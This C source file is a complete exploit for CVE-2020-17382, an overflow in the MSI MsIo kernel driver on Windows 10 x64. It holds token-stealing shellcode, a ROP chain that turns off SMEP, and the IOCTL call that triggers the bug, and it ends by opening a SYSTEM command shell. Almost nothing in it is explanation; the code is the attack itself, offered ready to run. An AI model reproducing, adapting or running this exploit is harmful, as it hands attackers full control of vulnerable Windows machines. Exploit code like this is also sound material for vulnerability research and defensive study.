#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <Psapi.h>

#pragma warning( disable : 6387 )

VOID eopMsio(HANDLE hFile, INT64 kernel_base, DWORD pid, DWORD IoControlCode) {
    BYTE token_steal[] =
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"
        "\x4C\x8B\x82\xB8\x00\x00\x00"
        "\x4D\x8B\x88\x48\x04\x00\x00"
        "\x49\x8B\x09"
        "\x48\x8B\x51\xF8"
        "\x48\x83\xFA\x04"
        "\x74\x05"
        "\x48\x8B\x09"
        "\xEB\xF1"
        "\x48\x8B\x41\x70"
        "\x24\xF0"
        "\x48\x8B\x51\xF8"
        "\x48\x81\xFA\x99\x99\x00\x00"
        "\x74\x05"
        "\x48\x8B\x09"
        "\xEB\xEE"
        "\x48\x89\x41\x70"
        "\x48\x31\xc0"
        "\x48\xc7\xc1\x78\x06\x37\x00"
        "\xc3";

    token_steal[54] = pid;
    token_steal[55] = pid >> 8;

    LPVOID allocated_shellcode = VirtualAlloc(NULL,
        sizeof(token_steal),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(allocated_shellcode, token_steal, sizeof(token_steal));

    INT64 rop_01 = kernel_base + 0x21f06c;            // pop rcx ; ret
    INT64 rop_02 = 0x00270678;                        // vmware esxi
    INT64 rop_03 = kernel_base + 0x38af57;            // mov cr4, ecx ; ret
    INT64 rop_04 = kernel_base + 0x36d640;            // wbinvd; ret
    INT64 rop_05 = kernel_base + 0x230154;            // add rsp, 0x08 ; ret
    
    BYTE payload[128] = { 0 };
    memcpy(payload + 72, (PINT64)&rop_01, 8);
    memcpy(payload + 80, (PINT64)&rop_02, 8);
    memcpy(payload + 88, (PINT64)&rop_03, 8);
    memcpy(payload + 96, (PINT64)&rop_04, 8);
    memcpy(payload + 104, (PINT64)&allocated_shellcode, 8);
    memcpy(payload + 112, (PINT64)&rop_03, 8);
    memcpy(payload + 120, (PINT64)&rop_05, 8);

    DWORD lpBytesReturned = 0x0;
    BOOL triggerIOCTL = DeviceIoControl(hFile,
        IoControlCode,
        payload,
        sizeof(payload),
        NULL,
        0,
        &lpBytesReturned,
        NULL);

    if (!triggerIOCTL) {
        printf("[!] DeviceIoControl failed: %d\n", GetLastError());
    }
    else {
        puts("[+] Enjoy your SYSTEM shell\n");
    }

    system("start cmd.exe");
}

LPVOID GetBaseAddr(const char* drvname) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        char szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (strcmp(szDrivers, drvname) == 0) {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}

HANDLE GetDriverHandle() {
    HANDLE hMsio;

    hMsio = CreateFileA("\\\\.\\MsIo",
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hMsio == INVALID_HANDLE_VALUE) {
        printf("[-] Error obtaining an handle to the driver: %d\n", GetLastError());
        exit(1);
    }

    return hMsio;
}

int main() {
    DWORD IoControlCode = 0x80102040;
    HANDLE hDevice = GetDriverHandle();
    INT64 nt = (INT64)GetBaseAddr("ntoskrnl.exe");
    DWORD pid = GetCurrentProcessId();

    puts("[+] CVE-2020-17382 Windows 10 x64 2004 Build 19041.264 Exploit");
    eopMsio(hDevice, nt, pid, IoControlCode);

    return 0;
}
